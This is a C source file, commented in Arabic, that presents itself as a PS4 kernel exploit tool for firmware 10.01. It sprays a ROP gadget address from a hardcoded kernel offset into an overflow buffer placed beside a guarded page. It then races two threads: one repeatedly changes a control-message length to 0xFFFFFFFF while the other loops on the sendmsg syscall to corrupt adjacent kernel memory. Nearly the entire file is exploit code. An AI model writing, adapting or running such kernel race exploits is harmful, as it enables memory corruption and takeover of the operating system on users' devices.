#include <ps4.h>

// --- إعدادات الذاكرة لـ PS4 (16KB Page) ---
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 256 
#define NCMSG         14   // عدد الهياكل لملء MLEN (224 بايت)

// --- الإزاحات لنسخة 10.01 ---
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;

// --- 1. بناء البفر الجراحي (Alignment & Protection) ---
void BuildPrecisionBuffer(uint64_t kbase) {
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    // حساب الحجم الكلي مع ضمان المحاذاة على حدود الصفحة
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);

    // حجز صفحتين: واحدة للبفر وواحدة للحماية (Unmapped)
    BaseArea = mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if (BaseArea == MAP_FAILED) {
        printf_debug("[!] mmap failed\n");
        return;
    }

    // تفعيل الحماية على الصفحة الثانية فوراً (تسبب EFAULT)
    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    // موازنة البفر (Offset) ليكون الـ OVERFLOW_SIZE في نهاية الصفحة تماماً
    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    // تهيئة الـ cmsghdr بقيم شرعية
    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_level = 0;
        ControlBuf[i].cmsg_type = 7; // IP_RETOPTS
    }

    // وضع الـ Gadget (السم) في منطقة التجاوز
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    
    for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }
}

// --- 2. خيط التخريب (The Wrecker) ---
void *wrecker_thread(void *arg) {
    while (!stop_race) {
        // العودة للحجم الصحيح
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i=0; i<40; i++); // تأخير نانوي ضبط التوقيت
        
        // التغيير للحجم الضخم (Race Condition)
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i=0; i<40; i++);
    }
    return NULL;
}

// --- 3. خيط التنفيذ (The Executor) ---
void *executor_thread(void *arg) {
    struct msghdr msg = {0};
    msg.msg_control = ControlBuf;
    msg.msg_controllen = ControlBufLen;
    const int bad_fd = 666; // نستخدم FD غير موجود لزيادة الاستقرار

    printf_debug("[+] Executor started, racing...\n");

    while (!stop_race) {
        n_tries++;
        int ret = syscall(28, bad_fd, &msg, 0); // sendmsg syscall
        
        // التحقق من الخطأ: 14 هو EFAULT (يعني أننا دهسنا الذاكرة ووصلنا للصفحة المحمية)
        if (ret == -1 && errno == 14) { 
            stop_race = 1;
            printf_debug("[***] SUCCESS! EFAULT detected at try: %llu\n", n_tries);
            // في هذه اللحظة، النواة دهست الـ mbuf المجاور بقيمنا وتوقفت "بسلام"
        }
        
        if (n_tries % 10000 == 0) {
            printf_debug("[.] Tries: %llu\n", n_tries);
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();
    initSysUtil(); // تهيئة خدمات النظام للعرض والتفاعل

    printf_debug("--- [PS4 Kernel Exploit Precision Tool] ---\n");

    uint64_t kbase = get_kernel_base();
    printf_debug("[+] Kernel Base: 0x%llx\n", kbase);

    BuildPrecisionBuffer(kbase);
    printf_debug("[+] Buffer ready at: %p\n", ControlBuf);

    ScePthread wrid, exid;
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");

    // ننتظر حتى ينجح السباق
    scePthreadJoin(exid, NULL);
    stop_race = 1; // إيقاف الـ wrecker بعد النجاح
    scePthreadJoin(wrid, NULL);

    printf_debug("[+] Exploit finished successfully.\n");
    return 0;
}
